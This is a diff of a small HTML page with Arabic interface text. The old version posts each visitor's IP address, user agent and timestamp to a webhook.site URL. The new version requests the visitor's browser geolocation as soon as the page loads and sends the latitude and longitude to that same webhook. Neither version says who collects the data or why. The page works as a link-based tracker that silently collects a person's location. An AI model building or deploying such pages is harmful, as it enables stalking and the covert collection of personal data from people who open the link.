@@ -1,32 +1,43 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>صفحة تتبع</title>
+  <title>Get Location</title>
 </head>
 <body>
-  <h1>مرحبا في صفحتي</h1>
-  <p>هذه صفحة اختبارية مع تتبع IP الزائر.</p>
+  <h1>جارٍ تحديد موقعك...</h1>
+  <p id="status">من فضلك انتظر...</p>
 
   <script>
-    // استدعاء API مجاني للحصول على IP الزائر
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const visitorIP = data.ip;
-        // إرسال IP إلى webhook.site الخاص بك
-        fetch('https://webhook.site/de39dc52-95ab-4c25-aba0-e1738a10f980', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            ip: visitorIP,
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-          })
-        });
+    function sendLocation(lat, lon) {
+      fetch("https://webhook.site/de39dc52-95ab-4c25-aba0-e1738a10f980", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon
+        })
       });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          document.getElementById("status").innerHTML = "تم الحصول على الموقع.";
+          sendLocation(lat, lon);
+        }, function(error) {
+          document.getElementById("status").innerHTML = "حدث خطأ: " + error.message;
+        });
+      } else {
+        document.getElementById("status").innerHTML = "المتصفح لا يدعم تحديد الموقع.";
+      }
+    }
+
+    // يبدأ تلقائياً عند فتح الصفحة
+    getLocation();
   </script>
 </body>
 </html>
